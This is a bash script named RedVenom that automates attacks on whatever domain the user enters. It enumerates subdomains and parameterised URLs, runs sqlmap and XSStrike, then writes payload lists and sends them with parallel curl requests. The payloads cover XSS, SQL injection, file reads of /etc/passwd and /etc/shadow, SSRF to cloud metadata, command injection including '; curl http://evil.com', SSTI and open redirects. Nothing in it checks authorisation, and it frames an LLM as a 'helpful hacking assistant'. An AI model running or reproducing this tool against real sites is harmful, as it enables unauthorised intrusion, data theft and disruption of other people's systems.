#!/bin/bash

# RedVenom v2.2 — Aggressive Web Recon & Attack Automation Tool
# Created by: Abdallah Yasser

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}"
echo "██████╗ ███████╗██████╗ ██╗   ██╗███████╗███╗   ███╗ ██████╗ ███╗   ███╗"
echo "██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝████╗ ████║██╔═══██╗████╗ ████║"
echo "██████╔╝█████╗  ██████╔╝██║   ██║█████╗  ██╔████╔██║██║   ██║██╔████╔██║"
echo "██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╔╝██║"
echo "██║     ███████╗██║     ╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║"
echo "╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
echo -e "${NC}"
echo -e "${CYAN}🔗 Created by Abdallah Yasser | RedVenom v2.2${NC}"
echo "==================================================================="

MAX_JOBS=50

manage_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.5
    done
}

ask_ai() {
    API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
    if [[ -z "$API_KEY" ]]; then
        echo -e "${RED}[-] No OpenRouter API key found in ~/.openrouter_key${NC}"
        return
    fi

    read -p "[?] Ask RedVenom AI anything: " USER_QUERY
    [[ -z "$USER_QUERY" ]] && echo -e "${RED}[-] No input provided.${NC}" && return

    echo -e "${CYAN}[*] Contacting RedVenom AI using mistralai/mistral-7b-instruct via OpenRouter...${NC}"

    RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
        -H "Authorization: Bearer $API_KEY" \
        -H "Content-Type: application/json" \
        -d "$(jq -n \
            --arg model "mistralai/mistral-7b-instruct" \
            --arg query "$USER_QUERY" \
            '{
                model: $model,
                messages: [
                    { "role": "system", "content": "You are RedVenom AI, a helpful hacking assistant." },
                    { "role": "user", "content": $query }
                ]
            }')"
    )

    MESSAGE=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
    [[ -z "$MESSAGE" ]] && echo -e "${RED}[-] Failed to get response. Raw API output:${NC}" && echo "$RESPONSE" | jq || {
        echo -e "${GREEN}[+] AI Response:${NC}"
        echo "$MESSAGE"
    }
}

summarize_results() {
    echo -e "${CYAN}[*] Summarizing results with RedVenom AI via OpenRouter...${NC}"

    API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
    [[ -z "$API_KEY" ]] && echo -e "${RED}[-] No OpenRouter API key found in ~/.openrouter_key${NC}" && return

    XSSTRIKE_SUMMARY=$(head -c 3000 recon_venom/xsstrike_results.txt 2>/dev/null)
    SQLMAP_SUMMARY=$(find recon_venom/sqlmap_results -name "*.csv" -exec head -c 3000 {} + 2>/dev/null)
    FUZZ_LOG=$(grep -E '^\[XSS\]|\[SQLi\]|\[LFI\]' recon_venom/fuzzing_log.txt | head -c 3000)

    PROMPT="You are a cybersecurity expert. Analyze the following data from a bug bounty recon & scan:\n\n[XSStrike Results]:\n$XSSTRIKE_SUMMARY\n\n[SQLMap Results]:\n$SQLMAP_SUMMARY\n\n[Fuzzing Phase]:\n$FUZZ_LOG\n\nSummarize key findings, severity, and what to focus on."

    RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
        -H "Authorization: Bearer $API_KEY" \
        -H "Content-Type: application/json" \
        -d @- <<EOF
{
  "model": "mistralai/mistral-7b-instruct",
  "messages": [
    { "role": "system", "content": "You are a cybersecurity expert writing a concise penetration test summary report." },
    { "role": "user", "content": "$PROMPT" }
  ]
}
EOF
    )

    SUMMARY=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
    echo -e "\n${GREEN}[+] Summary Report Generated:${NC}"
    echo "$SUMMARY"

    echo "$SUMMARY" > recon_venom/ai_report.txt
    echo -e "${CYAN}[✔] Report saved to recon_venom/ai_report.txt${NC}"
}



read -p "[?] Enter the target domain (e.g. example.com): " TARGET
read -p "[?] Do you want to enable VPN? (y/n): " VPN_OPTION

# PHASE 1 — VPN (Optional)
if [[ "$VPN_OPTION" == "y" ]]; then
    if pgrep openvpn > /dev/null; then
        echo -e "${GREEN}[+] VPN is already running.${NC}"
    else
        echo -e "${CYAN}[*] Starting OpenVPN...${NC}"
        sudo openvpn --config ~/vpn-config.ovpn &
        sleep 10
        if pgrep openvpn > /dev/null; then
            echo -e "${GREEN}[+] VPN connected successfully.${NC}"
        else
            echo -e "${RED}[-] VPN failed to connect. Exiting.${NC}"
            exit 1
        fi
    fi
else
    echo -e "${CYAN}[*] VPN skipped by user.${NC}"
fi

mkdir -p recon_venom results

# PHASE 2 — Recon


echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
rm -rf recon_venom/*
mkdir -p recon_venom

echo -e "${CYAN}[*] Running Subfinder...${NC}"
subfinder -d $TARGET -silent -o recon_venom/subdomains.txt & PID1=$!

echo -e "${CYAN}[*] Running gau...${NC}"
gau --subs --o recon_venom/gau_urls.txt $TARGET & PID2=$!


wait $PID1
echo -e "${CYAN}[*] Running httpx...${NC}"
httpx -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
wait $PID2
wait $PID3

WAIT_FOR_HTTPX=true
echo -e "${CYAN}[*] Running ParamSpider...${NC}"


paramspider -l recon_venom/httpx_live.txt > recon_venom/paramspider_raw.txt 2>/dev/null

echo -e "${CYAN}[*] Cleaning & Merging URLs...${NC}"

read -p "[?] Do you want full filtered output (only dynamic pages with params)? (y/n): " FILTER_OPTION

if [[ "$FILTER_OPTION" == "y" ]]; then
    echo -e "${CYAN}[*] Filtering for dynamic URLs only (.php, .asp, .jsp, .cgi)...${NC}"
    cat recon_venom/*.txt \
      | grep '?' \
      | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
      | grep -vE '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf)' \
      | sort -u > recon_venom/all_cleaned_urls.txt
else
    echo -e "${CYAN}[*] Using all parameterized URLs without filtering...${NC}"
    cat recon_venom/*.txt | grep '?' | sort -u > recon_venom/all_cleaned_urls.txt
fi


echo -e "${GREEN}[+] Recon phase complete.${NC}"

# PHASE 3 — Vulnerability Scanning (SQLMap + XSStrike)
echo -e "${CYAN}[*] Running SQLMap...${NC}"
sqlmap -m recon_venom/all_cleaned_urls.txt --batch --random-agent --output-dir=recon_venom/sqlmap_results

echo -e "${CYAN}[*] Running XSStrike...${NC}"
python3 XSStrike/xsstrike.py -l recon_venom/all_cleaned_urls.txt --skip --output recon_venom/xsstrike_results.txt

echo -e "${GREEN}[+] Scanning phase complete.${NC}"

# PHASE 4 — Fuzzing (XSS, SQLi, LFI, Open Redirect, SSTI, RCE)
echo -e "${CYAN}[*] Preparing payload files...${NC}"
mkdir -p payloads

# Create payloads/xss.txt if it doesn't exist
if [[ ! -f payloads/xss.txt ]]; then
cat << 'EOF' > payloads/xss.txt
"><svg/onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>
EOF
fi
# Create payloads/sqli.txt if it doesn't exist
if [[ ! -f payloads/sqli.txt ]]; then
cat << 'EOF' > payloads/sqli.txt
' OR 1=1 --
" OR "1"="1
admin' --
' OR sleep(5)--
' AND 1=1#
EOF
fi

# Create payloads/lfi.txt if it doesn't exist
if [[ ! -f payloads/lfi.txt ]]; then
cat << 'EOF' > payloads/lfi.txt
../../../../etc/passwd
../../../../../../etc/shadow
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
../../../boot.ini
EOF
fi
# Create payloads/open_redirect.txt if it doesn't exist
if [[ ! -f payloads/open_redirect.txt ]]; then
cat << 'EOF' > payloads/open_redirect.txt
//evil.com
http://evil.com
https://evil.com
//google.com%2F%2F@evil.com
/?next=http://evil.com
EOF
fi

# Create payloads/ssrf.txt if it doesn't exist
if [[ ! -f payloads/ssrf.txt ]]; then
cat << 'EOF' > payloads/ssrf.txt
http://127.0.0.1
http://localhost
http://169.254.169.254
http://[::1]
http://0.0.0.0
EOF
fi

# Create payloads/rce.txt if it doesn't exist
if [[ ! -f payloads/rce.txt ]]; then
cat << 'EOF' > payloads/rce.txt
;ls
| whoami
&& cat /etc/passwd
; ping -c 1 127.0.0.1
; curl http://evil.com
EOF
fi

# Create payloads/ssti.txt if it doesn't exist
if [[ ! -f payloads/ssti.txt ]]; then
cat << 'EOF' > payloads/ssti.txt
{{7*7}}
{{1337*1337}}
\${7*7}
\${{7*7}}
<%= 7 * 7 %>
EOF
fi

# Create payloads/json.txt if it doesn't exist
if [[ ! -f payloads/json.txt ]]; then
cat << 'EOF' > payloads/json.txt
{"username":"admin", "password":"' OR '1'='1"}
{"user":"\${7*7}"}
{"input":"<script>alert(1)</script>"}
{"path":"../../../../etc/passwd"}
{"redirect":"http://evil.com"}
EOF
fi


echo -e "${GREEN}[+] Payload files ready.${NC}"


echo -e "${CYAN}[*] Starting Fuzzing Phase...${NC}"
# Load payloads by type
mapfile -t XSS_PAYLOADS < payloads/xss.txt
mapfile -t SQLI_PAYLOADS < payloads/sqli.txt
mapfile -t LFI_PAYLOADS < payloads/lfi.txt
mapfile -t REDIRECT_PAYLOADS < payloads/open_redirect.txt
mapfile -t SSRF_PAYLOADS < payloads/ssrf.txt
mapfile -t RCE_PAYLOADS < payloads/rce.txt
mapfile -t SSTI_PAYLOADS < payloads/ssti.txt
mapfile -t JSON_PAYLOADS < payloads/json.txt

while read -r url; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[XSS] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${SQLI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[SQLi] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${LFI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[LFI] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[Redirect] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${SSRF_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[SSRF] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${RCE_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[RCE] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${SSTI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
        echo -e "[SSTI] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        curl -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${JSON_PAYLOADS[@]}"; do
        echo -e "[JSON] $url -- POST Payload: $payload" | tee -a recon_venom/fuzzing_log.txt
        curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url" -o /dev/null & manage_jobs
    done

done < recon_venom/all_cleaned_urls.txt

# Wait for all background jobs to finish
wait
read -p "[?] Do you want to ask RedVenom AI something? (y/n): " AI_OPTION
if [[ "$AI_OPTION" == "y" ]]; then
    ask_ai
fi
echo -e "${GREEN}[✔] RedVenom v2.2 finished. Results saved in recon_venom/.${NC}"


# PHASE 5 — Cleanup & VPN Disconnect
if [[ "$VPN_OPTION" == "y" ]]; then
    echo -e "${CYAN}[*] Disconnecting VPN...${NC}"
    sudo killall openvpn
    echo -e "${GREEN}[+] VPN disconnected.${NC}"
fi

echo -e "${GREEN}[✔] RedVenom v2.2 finished. Results saved in recon_venom/.${NC}"
